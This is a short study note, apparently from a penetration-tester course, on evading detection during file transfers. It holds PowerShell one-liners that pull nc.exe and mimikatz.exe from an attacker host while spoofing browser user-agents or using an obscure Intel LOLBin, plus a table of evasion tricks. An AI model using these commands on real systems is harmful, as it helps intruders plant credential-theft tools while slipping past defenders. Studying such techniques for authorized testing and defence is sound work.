### CPTS / HTB Penetration Tester Path <br>
### File Transfers - Evading Detection <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Evading Detection



Two main evasion vectors: spoofing user-agents to blend in, and using uncommon LOLBins not on the defender's watch list.

Change PowerShell UA — `Invoke-WebRequest` ships with predefined browser UAs in `[Microsoft.PowerShell.Commands.PSUserAgent]`. List them:

```diff
+ PS> [Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name, @{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```

Pull a file masquerading as Chrome:

```diff
+ PS> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+ PS> Invoke-WebRequest http://<ip>/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

Custom UA string — match a specific corporate-approved browser version:

```diff
+ PS> $CustomUA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
+ PS> Invoke-WebRequest http://<ip>/nc.exe -UserAgent $CustomUA -OutFile "C:\Users\Public\nc.exe"
```

Uncommon LOLBins — bypass app whitelisting + command-line logging by using trusted vendor binaries that ship with the OS or common third-party software. `GfxDownloadWrapper.exe` (Intel Graphics drivers) silently downloads URL → file path:

```diff
+ PS> GfxDownloadWrapper.exe "http://<ip>/mimikatz.exe" "C:\Temp\nc.exe"
```

| Technique | Purpose |
|---|---|
| `-UserAgent` predefined | mimic Chrome/Firefox/IE |
| Custom UA string | match a specific corporate browser fingerprint |
| `Invoke-RestMethod` / `WebClient` | alt cmdlets with full header control |
| HTTPS / encrypted tunnel | hide payload + headers from DPI |
| `bitsadmin`, `certutil` (no AMSI bypass) | well-known LOLBins, may be flagged |
| `GfxDownloadWrapper.exe` and friends | obscure vendor LOLBins, often whitelisted |
| Outbound proxy chaining | blend into legit egress traffic |

Reference projects:

- [LOLBAS](https://lolbas-project.github.io) — Windows binaries with off-label functionality.
- [GTFOBins](https://gtfobins.github.io) — Linux equivalents (curl/wget alternatives, file read/write, priv esc).
